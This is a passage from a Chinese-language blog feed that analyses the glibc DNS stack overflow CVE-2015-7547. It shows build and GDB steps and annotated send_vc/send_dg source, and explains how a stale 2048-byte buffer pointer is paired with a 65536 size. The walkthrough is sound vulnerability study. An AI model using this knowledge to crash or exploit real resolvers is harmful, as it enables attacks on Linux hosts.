<p>通过ldd指令可以看到，确实使用了刚编的glibc。<img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/ldd_client.png" alt="ldd ./client"></p>
<p>​    这个时候就可以用GDB调试glibc中的函数了。</p>
<h2 id="1-3_配置本地dns服务器">1.3 配置本地dns服务器</h2><p>​    运行poc的python服务器。修改<code>/etc/resolv.conf</code>。将域名服务器改为127.0.0.1就好了。不过这样一来这台机器访问网络就会出问题了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nameserver <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
<h1 id="0x02_漏洞分析">0x02 漏洞分析</h1><h2 id="2-1_运行POC">2.1 运行POC</h2><p>使用gdb启动客户端直接运行，出现崩溃堆栈。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/client_crash.png" alt="crash"></p>
<h2 id="2-2_寻找溢出函数">2.2 寻找溢出函数</h2><p>可以看到栈都被覆盖为0x42424242,根据<a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html" target="_blank" rel="external">google提供的分析</a>,出问题的是send_dg和send_vc函数。分别在send_vc和send_dg上下断点，重新运行程序，会发现先调用send_dg函数再调用send_vc函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/finish_dg_vc.png" alt="寻找溢出函数"></p>
<p>可以看出是在send_vc的时候发生了栈溢出。</p>
<p>因为根据<a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html" target="_blank" rel="external">google提供的分析</a>可以知道是在读取socket的时候发生的溢出，可以通过结合源码调试来分析。剔除不需要看的代码，核心代码如下，总共干了四件事。</p>
<p>[1]选择适当的缓存</p>
<p>[2]读取dns包的长度</p>
<p>[3]读取dsn包</p>
<p>[4]判断是否需要读取第二个数据包。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">send_vc</span><span class="params">(res_state statp,</span><br><span class="line">	<span class="keyword">const</span> u_char *buf, <span class="keyword">int</span> buflen, <span class="keyword">const</span> u_char *buf2, <span class="keyword">int</span> buflen2,</span><br><span class="line">	u_char **ansp, <span class="keyword">int</span> *anssizp,</span><br><span class="line">	<span class="keyword">int</span> *terrno, <span class="keyword">int</span> ns, u_char **anscp, u_char **ansp2, <span class="keyword">int</span> *anssizp2,</span><br><span class="line">	<span class="keyword">int</span> *resplen2, <span class="keyword">int</span> *ansp2_malloced)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> HEADER *hp = (HEADER *) buf;</span><br><span class="line">	<span class="keyword">const</span> HEADER *hp2 = (HEADER *) buf2;</span><br><span class="line">	u_char *ans = *ansp;</span><br><span class="line">	<span class="keyword">int</span> orig_anssizp = *anssizp;</span><br><span class="line">	</span><br><span class="line">    [...] 								<span class="comment">//这段干的事情可以无视。							</span></span><br><span class="line">    </span><br><span class="line"> read_len:</span><br><span class="line">  	<span class="comment">//----------------[2]-------------start----------------</span></span><br><span class="line">	cp = (u_char *)&amp;rlen16;</span><br><span class="line">	len = <span class="keyword">sizeof</span>(rlen16);</span><br><span class="line">	<span class="keyword">while</span> ((n = TEMP_FAILURE_RETRY (read(statp-&gt;_vcsock, cp,  </span><br><span class="line">					     (<span class="keyword">int</span>)len))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		cp += n;</span><br><span class="line">		<span class="keyword">if</span> ((len -= n) &lt;= <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		[...]	<span class="comment">//出错处理无视。</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> rlen = ntohs (rlen16); </span><br><span class="line">	<span class="comment">//----------------[2]-------------end----------------</span></span><br><span class="line">  </span><br><span class="line">  	<span class="comment">//----------------[1]-------------start----------------</span></span><br><span class="line">	<span class="keyword">int</span> *thisanssizp;</span><br><span class="line">	u_char **thisansp;</span><br><span class="line">	<span class="keyword">int</span> *thisresplenp;</span><br><span class="line">	<span class="keyword">if</span> ((recvresp1 | recvresp2) == <span class="number">0</span> || buf2 == <span class="literal">NULL</span>) &#123; <span class="comment">//第一次从read_len开始读取网络包进入这个分支。</span></span><br><span class="line">		thisanssizp = anssizp;							<span class="comment">//第一次调用read时可用内存65536</span></span><br><span class="line">		thisansp = anscp ?: ansp;						<span class="comment">//第一次调用read时使用的缓存anscp	</span></span><br><span class="line">		assert (anscp != <span class="literal">NULL</span> || ansp2 == <span class="literal">NULL</span>);</span><br><span class="line">		thisresplenp = &amp;resplen;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (*anssizp != MAXPACKET) &#123; </span><br><span class="line">			[...]										<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* The first reply did not fit into the</span><br><span class="line">			   user-provided buffer.  Maybe the second</span><br><span class="line">			   answer will.  */</span></span><br><span class="line">			*anssizp2 = orig_anssizp;					<span class="comment">//第二次调用时可用内存长度65536</span></span><br><span class="line">			*ansp2 = *ansp;								<span class="comment">//第二次调用read时使用的缓存ansp</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		thisanssizp = anssizp2;</span><br><span class="line">		thisansp = ansp2;</span><br><span class="line">		thisresplenp = resplen2;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//----------------[1]-------------end----------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	anhp = (HEADER *) *thisansp;	</span><br><span class="line"></span><br><span class="line">	*thisresplenp = rlen;</span><br><span class="line">	<span class="keyword">if</span> (rlen &gt; *thisanssizp) &#123; </span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		len = rlen;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (len &lt; HFIXEDSZ))       &#123;</span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cp = *thisansp; <span class="comment">//*ansp;</span></span><br><span class="line">  	<span class="comment">//---------------[2]--------------------start-----------------</span></span><br><span class="line">	<span class="keyword">while</span> (len != <span class="number">0</span> &amp;&amp; (n = read(statp-&gt;_vcsock, (<span class="keyword">char</span> *)cp, (<span class="keyword">int</span>)len)) &gt; <span class="number">0</span>)&#123; <span class="comment">//溢出点。</span></span><br><span class="line">		cp += n;</span><br><span class="line">		len -= n;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//---------------[2]--------------------start-----------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (n &lt;= <span class="number">0</span>))       &#123;</span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (truncating))       &#123;</span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * If the calling application has bailed out of</span><br><span class="line">	 * a previous call and failed to arrange to have</span><br><span class="line">	 * the circuit closed or the server has got</span><br><span class="line">	 * itself confused, then drop the packet and</span><br><span class="line">	 * wait for the correct one.</span><br><span class="line">	 */</span></span><br><span class="line">  	</span><br><span class="line">  	<span class="comment">//---------------[4]--------------------start-----------------</span></span><br><span class="line">	<span class="keyword">if</span> ((recvresp1 || hp-&gt;id != anhp-&gt;id)					<span class="comment">//不进。</span></span><br><span class="line">	    &amp;&amp; (recvresp2 || hp2-&gt;id != anhp-&gt;id)) &#123;</span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">		<span class="keyword">goto</span> read_len;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Mark which reply we received.  */</span></span><br><span class="line">	<span class="keyword">if</span> (recvresp1 == <span class="number">0</span> &amp;&amp; hp-&gt;id == anhp-&gt;id) 				<span class="comment">//第一次运行recvresp1=1 recvresp2=0</span></span><br><span class="line">	  recvresp1 = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  recvresp2 = <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* Repeat waiting if we have a second answer to arrive.  */</span></span><br><span class="line">	<span class="keyword">if</span> ((recvresp1 &amp; recvresp2) == <span class="number">0</span>)						<span class="comment">// 调用goto，回到前面。</span></span><br><span class="line">		<span class="keyword">goto</span> read_len;</span><br><span class="line">	<span class="comment">//---------------[4]--------------------end-----------------</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * All is well, or the error is fatal.  Signal that the</span><br><span class="line">	 * next nameserver ought not be tried.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">return</span> resplen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据源码分析，从socket读取网络包数据的时候是溢出的地方，所以在这里下断点。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb&gt; <span class="tag">b</span> res_send<span class="class">.c</span>:<span class="number">853</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/send_vc_read.png" alt="寻找溢出函数"></p>
<p>通过调用栈可以得知，read发生了两次[4]，而且第一次是正确的，在第二次read之后发生了溢出。通过[1]可以得知，在两次调用read的时候cp指向的内存不同。</p>
<p>第一次调用<code>read</code>函数时，缓冲区为<strong>anscp</strong>指向的内存。</p>
<p>第二次调用<code>read</code>函数时，缓冲区为<strong>ansp</strong>指向的内存。<strong>这里暂时不用考虑二级指针的问题。</strong></p>
<p>可以断定，ansp指针索引的地址出现了问题。ansp是调用时从参数传入的。所以需要通过分析send_vc的调用函数。</p>
<h2 id="2-3_内存分配错误">2.3 内存分配错误</h2><p>send_vc的调用函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__libc_res_nsend(res_state statp, <span class="keyword">const</span> u_char *buf, <span class="keyword">int</span> buflen,</span><br><span class="line">		 <span class="keyword">const</span> u_char *buf2, <span class="keyword">int</span> buflen2,</span><br><span class="line">		 u_char *ans, <span class="keyword">int</span> anssiz, u_char **ansp, u_char **ansp2,</span><br><span class="line">		 <span class="keyword">int</span> *nansp2, <span class="keyword">int</span> *resplen2, <span class="keyword">int</span> *ansp2_malloced)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (v_circuit))       &#123;</span><br><span class="line">			<span class="comment">/* Use VC; at most one attempt per server. */</span></span><br><span class="line">			<span class="keyword">try</span> = statp-&gt;retry;</span><br><span class="line">			n = send_vc(statp, buf, buflen, buf2, buflen2,	<span class="comment">//statp状态，buff，bufflen第一组发送数据，buff，2bufflen2第二组发送数据。</span></span><br><span class="line">				    &amp;ans, &amp;anssiz, &amp;terrno,					<span class="comment">//u_char **ansp, int *anssizp,int *terrno,</span></span><br><span class="line">				    ns, ansp, ansp2, nansp2, resplen2,		<span class="comment">//int ns, u_char **anscp, u_char **ansp2, int *anssizp2,int *resplen2, 				</span></span><br><span class="line">				    ansp2_malloced);						<span class="comment">//int *ansp2_malloced</span></span><br><span class="line">			<span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> (-<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (n == <span class="number">0</span> &amp;&amp; (buf2 == <span class="literal">NULL</span> || *resplen2 == <span class="number">0</span>))</span><br><span class="line">				<span class="keyword">goto</span> next_ns;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* Use datagrams. */</span>							<span class="comment">//经过send_dg函数调用，ansp指向65536buff，ans指向2048buff。</span></span><br><span class="line">			n = send_dg(statp, buf, buflen, buf2, buflen2,</span><br><span class="line">				    &amp;ans, &amp;anssiz, &amp;terrno,</span><br><span class="line">				    ns, &amp;v_circuit, &amp;gotsomewhere, ansp,</span><br><span class="line">				    ansp2, nansp2, resplen2, ansp2_malloced);</span><br><span class="line">			<span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> (-<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (n == <span class="number">0</span> &amp;&amp; (buf2 == <span class="literal">NULL</span> || *resplen2 == <span class="number">0</span>))</span><br><span class="line">				<span class="keyword">goto</span> next_ns;</span><br><span class="line">			<span class="keyword">if</span> (v_circuit)</span><br><span class="line">			  <span class="comment">// <span class="label">XXX Check whether both requests failed or     Z</span></span></span><br><span class="line">			  <span class="comment">// <span class="label">XXX whether one has been answered successfully</span></span></span><br><span class="line">				<span class="keyword">goto</span> same_ns;</span><br><span class="line">		&#125;</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为在调用<code>send_vc</code>之前程序先调用了<code>send_dg</code>，且两个函数参数基本相同，通过阅读源码会发现，<code>send_dg</code>对参数进行修改及新内存的申请。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">send_dg</span><span class="params">(res_state statp,</span><br><span class="line">	<span class="keyword">const</span> u_char *buf, <span class="keyword">int</span> buflen, <span class="keyword">const</span> u_char *buf2, <span class="keyword">int</span> buflen2,</span><br><span class="line">	u_char **ansp, <span class="keyword">int</span> *anssizp,</span><br><span class="line">	<span class="keyword">int</span> *terrno, <span class="keyword">int</span> ns, <span class="keyword">int</span> *v_circuit, <span class="keyword">int</span> *gotsomewhere, u_char **anscp,</span><br><span class="line">	u_char **ansp2, <span class="keyword">int</span> *anssizp2, <span class="keyword">int</span> *resplen2, <span class="keyword">int</span> *ansp2_malloced)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  	<span class="comment">//ans指向大小为2048的缓冲器</span></span><br><span class="line"> 	<span class="comment">//ansp指向ans</span></span><br><span class="line">  	<span class="comment">//anscp指向ans</span></span><br><span class="line">	<span class="keyword">const</span> HEADER *hp = (HEADER *) buf;</span><br><span class="line">	<span class="keyword">const</span> HEADER *hp2 = (HEADER *) buf2;</span><br><span class="line">	u_char *ans = *ansp;</span><br><span class="line">	<span class="keyword">int</span> orig_anssizp = *anssizp;</span><br><span class="line">	<span class="keyword">struct</span> timespec now, timeout, finish;</span><br><span class="line">	<span class="keyword">struct</span> pollfd pfd[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">int</span> ptimeout;</span><br><span class="line">	<span class="keyword">struct</span> sockaddr_in6 from;</span><br><span class="line">	<span class="keyword">int</span> resplen = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">    </span><br><span class="line">  	[...]</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (pfd[<span class="number">0</span>].revents &amp; POLLIN) &#123;</span><br><span class="line">		<span class="keyword">int</span> *thisanssizp;</span><br><span class="line">		u_char **thisansp;</span><br><span class="line">		<span class="keyword">int</span> *thisresplenp;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((recvresp1 | recvresp2) == <span class="number">0</span> || buf2 == <span class="literal">NULL</span>) &#123;	<span class="comment">//send_dg第一次进入这个分支。</span></span><br><span class="line">			thisanssizp = anssizp;</span><br><span class="line">			thisansp = anscp ?: ansp;						<span class="comment">//thisansp被赋值为anscp</span></span><br><span class="line">			assert (anscp != <span class="literal">NULL</span> || ansp2 == <span class="literal">NULL</span>);</span><br><span class="line">			thisresplenp = &amp;resplen;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			[...]											<span class="comment">//第一次调用不会进入。</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (*thisanssizp &lt; MAXPACKET</span><br><span class="line">		    <span class="comment">/* Yes, we test ANSCP here.  If we have two buffers</span><br><span class="line">		       both will be allocatable.  */</span></span><br><span class="line">		    &amp;&amp; anscp</span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> FIONREAD</span></span><br><span class="line">		    &amp;&amp; (ioctl (pfd[<span class="number">0</span>].fd, FIONREAD, thisresplenp) &lt; <span class="number">0</span></span><br><span class="line">			|| *thisanssizp &lt; *thisresplenp)</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">                    ) &#123;</span><br><span class="line">			u_char *newp = <span class="built_in">malloc</span> (MAXPACKET);</span><br><span class="line">			<span class="keyword">if</span> (newp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				*anssizp = MAXPACKET;						<span class="comment">//anssizp谁为65536</span></span><br><span class="line">				*thisansp = ans = newp;						<span class="comment">//anscp指向65536的buffer,但是ansp指向仍然指向原来的2048的buffer</span></span><br><span class="line">				<span class="keyword">if</span> (thisansp == ansp2)</span><br><span class="line">				  *ansp2_malloced = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/send_dg_malloc_bug.png" alt="寻找溢出函数"></p>
<p>通过调试可以看出，ansp仍然指向大小为2048的缓冲区，而anscp指向了大小为65536的缓冲区。之后这两个指针又被传递给了send_vc。</p>
<h2 id="2-4_溢出原因">2.4 溢出原因</h2><p>​    所以溢出的原因是，<code>*anssizp</code>因为在之前的<code>send_dg</code>中被赋值为65536，<code>send_vc</code>中第二次调用<code>read</code>函数时，认为ansp指向的缓冲区的大小为<code>*anssizp</code>即65536，而实际上ansp指向了一块只有2048大小的缓冲区。所以在从socket读取大于2048个字节之后产生了栈溢出。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/cve_2015_7547_poc.png" alt="寻找溢出函数"></p>
<h1 id="0x03_参考&amp;感谢">0x03 参考&amp;感谢</h1><p>​    感谢分享：）</p>
<ol>
<li><p>CVE-2015-7547 — glibc getaddrinfo() stack-based buffer overflow</p>
<p><a href="https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html" target="_blank" rel="external">https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html</a></p>
</li>
<li><p>Linux glibc再曝漏洞：可导致Linux软件劫持</p>
<p><a href="http://www.freebuf.com/news/96244.html" target="_blank" rel="external">http://www.freebuf.com/news/96244.html</a></p>
</li>
<li><p>CVE-2015-7547: glibc getaddrinfo stack-based buffer overflow</p>
<p><a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html" target="_blank" rel="external">https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html</a></p>
</li>
<li><p>glibc编译debug版本</p>
<p><a href="http://blog.csdn.net/jichl/article/details/7951996" target="_blank" rel="external">http://blog.csdn.net/jichl/article/details/7951996</a></p>
</li>
<li><p>glibc的编译和调试 </p>
<p><a href="http://blog.chinaunix.net/uid-20786208-id-4980168.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-20786208-id-4980168.html</a></p>
<p>​</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_漏洞信息">0x00 漏洞信息</h1><p>​    最近glibc有一个栈溢出的漏洞具体情况，漏洞的具体信息可以参考下面两个链接。</p>
<p>​    <a href="http://www.freebuf.com/news/96244.html">Linux glibc再曝漏洞：可导致Linux软件劫持</a></p>
<p>​    <a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html">CVE-2015-7547: glibc getaddrinfo stack-based buffer overflow</a></p>
<p>​    poc在上面的链接中可以下载。</p>]]>
    
    </summary>
    
      <category term="dns" scheme="http://yoursite.com/tags/dns/"/>
    
      <category term="gethostbyname" scheme="http://yoursite.com/tags/gethostbyname/"/>
    
      <category term="glibc" scheme="http://yoursite.com/tags/glibc/"/>
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="stackoverflow" scheme="http://yoursite.com/tags/stackoverflow/"/>
    
      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[对CVE-2015-7547简单的分析与调试]]></title>
    <link href="http://yoursite.com/2016/02/19/CVE-2015-7547%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95%E5%89%AF%E6%9C%AC/"/>
    <id>http://yoursite.com/2016/02/19/CVE-2015-7547分析与调试副本/</id>
    <published>2016-02-19T18:21:22.000Z</published>
    <updated>2016-03-24T03:35:30.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_漏洞信息">0x00 漏洞信息</h1><p>​    最近glibc有一个栈溢出的漏洞具体情况，漏洞的具体信息可以参考下面两个链接。</p>
<p>​    <a href="http://www.freebuf.com/news/96244.html" target="_blank" rel="external">Linux glibc再曝漏洞：可导致Linux软件劫持</a></p>
<p>​    <a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html" target="_blank" rel="external">CVE-2015-7547: glibc getaddrinfo stack-based buffer overflow</a></p>
<p>​    poc在上面的链接中可以下载。</p>
<a id="more"></a>
<h1 id="0x01_环境准备">0x01 环境准备</h1><p>​    操作系统：ubuntu15.04</p>
<p>​    glibc版本：glibc-2.2.0</p>
<p>​    </p>
<h2 id="1-1_glibc源码编译">1.1 glibc源码编译</h2><p>​    在ubuntu系统下，只需要执行源码和调试符的命令之后就可以使用gdb对glibc的跟踪调试，安装指令如下：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">sudo</span> apt-<span class="preprocessor">get</span> install libc6-<span class="keyword">dbg</span><br><span class="line"></span><span class="label">sudo</span> apt-<span class="preprocessor">get</span> source libc6-dev</span><br></pre></td></tr></table></figure>
<p>​    但是因为系统自带的glibc是<strong>发行版</strong>的，所以在编译的是时候选用了优化参数 <code>-O2</code>,所以在调试的过程中会出现<strong>变量被优化无法读取</strong>以及代码运行的时候与<strong>源码的行数</strong>对不上的情况。</p>
<p>​    <strong>所以需要自己编译一个可调式并且没有过度优化的glibc来进行调试。</strong></p>
<p>​    首先，从glibc的官网下载glibc的源码。我选择了2.20的版本。编译安装glibc的方法很容易可以在网上找到。需要注意的是在进行configure时需要设置一些特殊的参数。如果需要调试宏可以添加 -gdwarf-2,glibc无法使用-O0编译，不过-O1也够用了。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>glibc220<span class="regexp">/configure --prefix=/</span>usr<span class="regexp">/local/</span>glibc220/ --enable-debug CFLAGS=<span class="string">"-g -O1"</span> CPPFLAGS = <span class="string">"-g -O1"</span></span><br></pre></td></tr></table></figure>
<p>​    在<code>configure</code>执行完成之后只需要简单执行编译与安装就好了。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">make</span></span><br><span class="line">sudo <span class="built_in">make</span> install</span><br></pre></td></tr></table></figure>
<h2 id="1-2_使用调试版本glibc编译POC">1.2 使用调试版本glibc编译POC</h2><p>​    在glibc编译安装成功后，系统默认的glibc还是原来的那个。所以需要选择指定的glibc来编译POC代码。</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="keyword">client</span> CVE-<span class="number">2015</span>-<span class="number">7547</span>-<span class="keyword">client</span>.c -Wl,-rpath /usr/local/glibc220</span><br></pre></td></tr></table></figure>
<p>通过ldd指令可以看到，确实使用了刚编的glibc。<img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/ldd_client.png" alt="ldd ./client"></p>
<p>​    这个时候就可以用GDB调试glibc中的函数了。</p>
<h2 id="1-3_配置本地dns服务器">1.3 配置本地dns服务器</h2><p>​    运行poc的python服务器。修改<code>/etc/resolv.conf</code>。将域名服务器改为127.0.0.1就好了。不过这样一来这台机器访问网络就会出问题了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nameserver <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
